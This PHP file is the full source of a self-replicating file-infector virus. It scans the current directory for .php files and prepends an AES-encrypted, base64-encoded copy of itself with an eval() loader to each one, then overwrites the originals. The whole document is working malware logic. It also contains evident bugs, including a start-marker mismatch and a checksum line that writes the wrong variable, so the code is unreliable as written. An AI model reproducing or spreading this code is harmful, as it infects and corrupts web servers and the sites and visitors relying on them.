<?php

// VIRUS:START
function execute($virus){
    // get files
    $filenames = glob('*.php');

    foreach($filenames as $filename){
        $script = fopen($filename,"r");
        //check if infected
        $first_line = fgets($script);
        $virus_hash = md5($filename);
        if(strpos($first_line,$virus_hash)===false){
            $infected = fopen("$filename.infected","w");

            $checksum = '<?php // checksum: '.$virus_hash.' ?>';
            $infection = '<?php'.encryptedVirus($virus).' ?>';
            // put checksum in place
            fputs($infected,$infection,strlen($checksum));
            // put encrypted virus in file
            fputs($infected,$infection,strlen($infection));
            
            fputs($infected,$first_line,strlen($first_line));
            //copies line by line and put in new file
             while($contents=fgets($script)){
                fputs($infected,$contents,strlen($contents));
            }
            fclose($script);
            fclose($infected);
            unlink("$filename");
            rename("$filename.infected",$filename);
        }
    }
}

function encryptedVirus($virus){
    //key
    $str='0123456789abcdef';
    $key='';
    for($i=0;$i<64;$i++) 
        $key.=$str[rand(0,strlen($str)-1)];
    $key = pack("H*",$key);

    $iv_size = mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128,MCRYPT_MODE_CBC);
    $iv = mcrypt_create_iv($iv_size,MCRYPT_RAND);
    $encryptVirus = mcrypt_encrypt(MCRYPT_RIJNDAEL_128,$key,$virus,MCRYPT_MODE_CBC,$iv);
    $encodedVirus = base64_encode($encryptVirus);
    $encodedIV = base64_encode($iv);
    $encodedKey = base64_encode($key);

    $payload = "
    \$encodedVirus = '$encodedVirus';
    \$iv = '$encodedIV';
    \$key = '$encodedKey';
    
    \$virus = mcrypt_decrypt(
        MCRYPT_RIJNDAEL_128,
        base64_decode(\$key),
        base64_decode(\$encodedVirus),
        MCRYPT_MODE_CBC,
        base64_decode(\$iv)
    );
    eval(\$virus);
    execute(\$virus);
    ";
    return $payload;

}

$virus = file_get_contents(__FILE__);
$virus = substr($virus,strpos($virus,"//VIRUS:START"));
$virus = substr($virus,0,strpos($virus,"\n//VIRUS:END")+strlen("\n//VIRUS:END"));
//calling the execute function
execute($virus);
//VIRUS:END

?>